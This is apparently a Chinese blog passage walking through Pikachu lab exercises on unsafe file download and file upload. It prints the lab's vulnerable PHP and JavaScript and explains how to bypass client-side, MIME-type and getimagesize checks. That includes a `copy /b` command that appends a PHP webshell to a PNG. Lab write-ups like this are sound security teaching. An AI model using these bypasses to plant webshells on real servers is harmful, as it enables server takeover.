</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$file_count</span><span class="o">&lt;</span><span class="nv">$file_size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$file_con</span><span class="o">=</span><span class="nx">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file_count</span><span class="o">+=</span><span class="nv">$buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$file_con</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>可以看到后端只是对a标签做简单的拼接而未对标签做任何校验</p>
<h3 id="防范措施">防范措施</h3>
<ul>
<li>对传入的文件名进行严格的过滤和限定</li>
<li>对文件下载的目录进行严格的限定</li>
</ul>
<h2 id="unsafe-fileupload">Unsafe Fileupload</h2>
<h3 id="概述-7">概述</h3>
<p>文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等</p>
<p>当用户点击上传按钮后，后台会对上传的文件进行判断，比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录</p>
<p>如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell</p>
<p>所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑，比如：</p>
<ul>
<li>验证文件类型、后缀名、大小</li>
<li>验证文件的上传方式</li>
<li>对文件进行一定复杂的重命名</li>
<li>不要暴露文件上传后的路径</li>
</ul>
<p>文件上传漏洞测试的流程</p>
<ol>
<li>对文件上传的地方按照要求上传文件，查看返回结果（路径、提示等）</li>
<li>尝试上传不同类型的恶意文件（php文件等），分析结果</li>
<li>查看HTML源码，看是否通过JavaScript在前端做了上传限制、是否可以绕过</li>
<li>尝试使用不同方式绕过，如黑白名单绕过、MIME类型绕过、目录0x00截断绕过等</li>
<li>猜测或结合其他类型漏洞（如敏感信息泄露等）得到木马路径，连接测试</li>
</ol>
<h3 id="client-check">client check</h3>
<p>页面里是一个上传图片的表单，我们上传个一句话木马试试</p>
<p><img alt="img" src="./img/2022090-12.png"></p>
<p>立即弹出窗口警告不允许上传txt文件，合理猜测文件类型限定是写在前端的</p>
<p>看看前端代码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;page-content&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;usu_main&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;title&#34;</span><span class="p">&gt;</span>这里只允许上传图片o！<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">form</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;upload&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span>  <span class="na">action</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;uploadfile&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span>  <span class="na">name</span><span class="o">=</span><span class="s">&#34;uploadfile&#34;</span> <span class="na">onchange</span><span class="o">=</span><span class="s">&#34;checkFileExt(this.value)&#34;</span><span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;sub&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;开始上传&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>选中文件时前端会调用JavaScript的<code>checkFileExt()</code>方法</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nx">checkFileExt</span><span class="p">(</span><span class="nx">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">flag</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span> <span class="c1">//状态
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;jpg&#34;</span><span class="p">,</span><span class="s2">&#34;png&#34;</span><span class="p">,</span><span class="s2">&#34;gif&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//取出上传文件的扩展名
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">var</span> <span class="nx">index</span> <span class="o">=</span> <span class="nx">filename</span><span class="p">.</span><span class="nx">lastIndexOf</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">ext</span> <span class="o">=</span> <span class="nx">filename</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">index</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//比较
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">ext</span> <span class="o">==</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">flag</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">//一旦找到合适的，立即退出循环
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//条件判断
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;上传的文件不符合要求，请重新选择！&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">location</span><span class="p">.</span><span class="nx">reload</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>但是一切写在前端的防护都是不靠谱的</p>
<p>我们删掉上传按钮的方法调用再来上传试试</p>
<p><img alt="img" src="./img/2022091-9.png"></p>
<p>上传成功了，甚至还给了我们半个路径什么菩萨</p>
<p>访问一下</p>
<p><img alt="img" src="./img/2022092-5.png"></p>
<p>这里只简单演示，不做其他操作了其实是传错文件了</p>
<h3 id="mime-type">MIME type</h3>
<p>多用途互联网邮件扩展类型MIME（Multipurpose Internet Mail Extensions）是设定某种扩展名的文件用一种应用程序打开的方式类型。当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开，多用于指定一些客户端自定义的文件名以及一些媒体文件打开方式</p>
<p>每个MIME类型由两部分组成，前面是数据的大类型，例如声音、图像等，后面定义具体的种类</p>
<p>常见的MIME类型有</p>
<ul>
<li>超文本标记语言文本：.html text/html</li>
<li>普通文本：.txt text/plain</li>
<li>RTF文本：.rtf application/rtf</li>
<li>GIF文本：.gif image/gif</li>
<li>JPEG图形：.ipeg、.jpg image/jpeg</li>
</ul>
<p>通过使用PHP的全局数组<code>$_FILES</code>，我们可以从客户计算机向远程服务器上传文件</p>
<p>第一个参数是表单的input name，第二个下标可以是<code>&quot;name&quot;</code>、<code>&quot;type&quot;</code>、<code>&quot;size&quot;</code>、<code>&quot;tmp_name&quot;</code>或<code>&quot;error&quot;</code></p>
<ul>
<li><code>$_FILES[&quot;file&quot;][&quot;name&quot;]</code>：上传文件的名称</li>
<li><code>$_FILES[&quot;file&quot;][&quot;type&quot;]</code>：上传文件的类型</li>
<li><code>$_FILES[&quot;file&quot;][&quot;size&quot;]</code>：上传文件的大小，以字节计</li>
<li><code>$_FILES[&quot;file&quot;][&quot;tmp_name&quot;]</code>：存储在服务器的文件的临时副本的名称</li>
<li><code>$_FILES[&quot;file&quot;][&quot;error&quot;]</code>：由文件上传导致的错误代码</li>
</ul>
<p>依旧是上传文件，不过这次做了MIME类型验证</p>
<p><img alt="img" src="./img/2022091-0-2.png"></p>
<p>来看看后端源码片段</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;clientcheck.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span> <span class="o">.</span> <span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;inc/uploadfunction.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$html</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl"><span class="c1">//     var_dump($_FILES);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$mime</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;image/jpg&#39;</span><span class="p">,</span><span class="s1">&#39;image/jpeg&#39;</span><span class="p">,</span><span class="s1">&#39;image/png&#39;</span><span class="p">);</span><span class="c1">//指定MIME类型,这里只是对MIME类型做了判断。
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$save_path</span><span class="o">=</span><span class="s1">&#39;uploads&#39;</span><span class="p">;</span><span class="c1">//指定在当前目录建立一个目录
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$upload</span><span class="o">=</span><span class="nx">upload_sick</span><span class="p">(</span><span class="s1">&#39;uploadfile&#39;</span><span class="p">,</span><span class="nv">$mime</span><span class="p">,</span><span class="nv">$save_path</span><span class="p">);</span><span class="c1">//调用函数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nv">$upload</span><span class="p">[</span><span class="s1">&#39;return&#39;</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p class=&#39;notice&#39;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#39;notice&#39;&gt;文件保存的路径为：</span><span class="si">{</span><span class="nv">$upload</span><span class="p">[</span><span class="s1">&#39;new_path&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p class=notice&gt;</span><span class="si">{</span><span class="nv">$upload</span><span class="p">[</span><span class="s1">&#39;error&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">//只通过MIME类型验证了一下图片类型，其他的无验证,upsafe_upload_check.php
</span></span></span><span class="line"><span class="cl"><span class="err">function upload_sick($key,$mime,$save_path){
</span></span></span><span class="line"><span class="cl"><span class="err">    $arr_errors=array(
</span></span></span><span class="line"><span class="cl"><span class="err">        1=&gt;&#39;上传的文件超过了 php.ini中 upload_max_filesize 选项限制的值&#39;,
</span></span></span><span class="line"><span class="cl"><span class="err">        2=&gt;&#39;上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值&#39;,
</span></span></span><span class="line"><span class="cl"><span class="err">        3=&gt;&#39;文件只有部分被上传&#39;,
</span></span></span><span class="line"><span class="cl"><span class="err">        4=&gt;&#39;没有文件被上传&#39;,
</span></span></span><span class="line"><span class="cl"><span class="err">        6=&gt;&#39;找不到临时文件夹&#39;,
</span></span></span><span class="line"><span class="cl"><span class="err">        7=&gt;&#39;文件写入失败&#39;
</span></span></span><span class="line"><span class="cl"><span class="err">    );
</span></span></span><span class="line"><span class="cl"><span class="err">    if(!isset($_FILES[$key][&#39;error&#39;])){
</span></span></span><span class="line"><span class="cl"><span class="err">        $return_data[&#39;error&#39;]=&#39;请选择上传文件！&#39;;
</span></span></span><span class="line"><span class="cl"><span class="err">        $return_data[&#39;return&#39;]=false;
</span></span></span><span class="line"><span class="cl"><span class="err">        return $return_data;
</span></span></span><span class="line"><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="cl"><span class="err">    if ($_FILES[$key][&#39;error&#39;]!=0) {
</span></span></span><span class="line"><span class="cl"><span class="err">        $return_data[&#39;error&#39;]=$arr_errors[$_FILES[$key][&#39;error&#39;]];
</span></span></span><span class="line"><span class="cl"><span class="err">        $return_data[&#39;return&#39;]=false;
</span></span></span><span class="line"><span class="cl"><span class="err">        return $return_data;
</span></span></span><span class="line"><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="cl"><span class="err">    //验证一下MIME类型
</span></span></span><span class="line"><span class="cl"><span class="err">    if(!in_array($_FILES[$key][&#39;type&#39;], $mime)){
</span></span></span><span class="line"><span class="cl"><span class="err">        $return_data[&#39;error&#39;]=&#39;上传的图片只能是jpg,jpeg,png格式的！&#39;;
</span></span></span><span class="line"><span class="cl"><span class="err">        $return_data[&#39;return&#39;]=false;
</span></span></span><span class="line"><span class="cl"><span class="err">        return $return_data;
</span></span></span><span class="line"><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="cl"><span class="err">    //新建一个保存文件的目录
</span></span></span><span class="line"><span class="cl"><span class="err">    if(!file_exists($save_path)){
</span></span></span><span class="line"><span class="cl"><span class="err">        if(!mkdir($save_path,0777,true)){
</span></span></span><span class="line"><span class="cl"><span class="err">            $return_data[&#39;error&#39;]=&#39;上传文件保存目录创建失败，请检查权限!&#39;;
</span></span></span><span class="line"><span class="cl"><span class="err">            $return_data[&#39;return&#39;]=false;
</span></span></span><span class="line"><span class="cl"><span class="err">            return $return_data;
</span></span></span><span class="line"><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="cl"><span class="err">    $save_path=rtrim($save_path,&#39;/&#39;).&#39;/&#39;;//给路径加个斜杠
</span></span></span><span class="line"><span class="cl"><span class="err">    if(!move_uploaded_file($_FILES[$key][&#39;tmp_name&#39;],$save_path.$_FILES[$key][&#39;name&#39;])){
</span></span></span><span class="line"><span class="cl"><span class="err">        $return_data[&#39;error&#39;]=&#39;临时文件移动失败，请检查权限!&#39;;
</span></span></span><span class="line"><span class="cl"><span class="err">        $return_data[&#39;return&#39;]=false;
</span></span></span><span class="line"><span class="cl"><span class="err">        return $return_data;
</span></span></span><span class="line"><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="cl"><span class="err">    //如果以上都通过了，则返回这些值，存储的路径，新的文件名（不要暴露出去）
</span></span></span><span class="line"><span class="cl"><span class="err">    $return_data[&#39;new_path&#39;]=$save_path.$_FILES[$key][&#39;name&#39;];
</span></span></span><span class="line"><span class="cl"><span class="err">    $return_data[&#39;return&#39;]=true;
</span></span></span><span class="line"><span class="cl"><span class="err">    return $return_data;
</span></span></span><span class="line"><span class="cl"><span class="err">    
</span></span></span><span class="line"><span class="cl"><span class="err">}
</span></span></span></code></pre></div><p>这里其实是用<code>$_FILES[&quot;file&quot;]</code>获取了文件类型并进行比较，但<code>$_FILES</code>是从浏览器的http header进行信息获取的</p>
<p>逻辑搞懂了，我们来抓个包</p>
<p>先上传正常的图片</p>
<p><img alt="img" src="./img/2022091-3-1.png"></p>
<p>复制一下正常的<code>Content-Type</code></p>
<p>再来上传我们的一句话木马，改一下<code>Content-Type</code></p>
<p><img alt="img" src="./img/2022091-1-2.png"></p>
<p><img alt="img" src="./img/2022091-2-1.png"></p>
<p>可以看到文件被成功上传了</p>
<p>剩下的就和之前一样了，不再赘述</p>
<p><img alt="img" src="./img/2022091-4-1.png"></p>
<h3 id="getimagesize">Getimagesize</h3>
<p><code>Getimagesize()</code>函数返回的结果中有文件的类型和文件大小，函数会通过判断文件头来判断是否是图片</p>
<p>但我们可以通过伪造文件头来绕过函数</p>
<p>图片木马的制作有几种方法</p>
<ul>
<li>
<p>直接伪造文件头</p>
</li>
<li>
<p>Windows下CMD：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">copy </span><span class="p">/</span><span class="n">b</span> <span class="n">test</span><span class="p">.</span><span class="py">png</span> <span class="p">+</span> <span class="n">muma</span><span class="p">.</span><span class="py">php</span> <span class="n">muma</span><span class="p">.</span><span class="py">png</span>
</span></span></code></pre></div><ul>
<li>命令意为在test.png尾部拼接muma.php生成新文件muma.png</li>
</ul>
</li>
<li>
<p>使用开源软件<a href="https://www.gimp.org/">GIMP</a>，通过增加备注写入执行命令</p>
</li>
</ul>
<p>我们使用第二个方法</p>
<p><img alt="img" src="./img/202209phpinfo.png"></p>
<p><strong>没有樱之刻玩我要死了</strong></p>
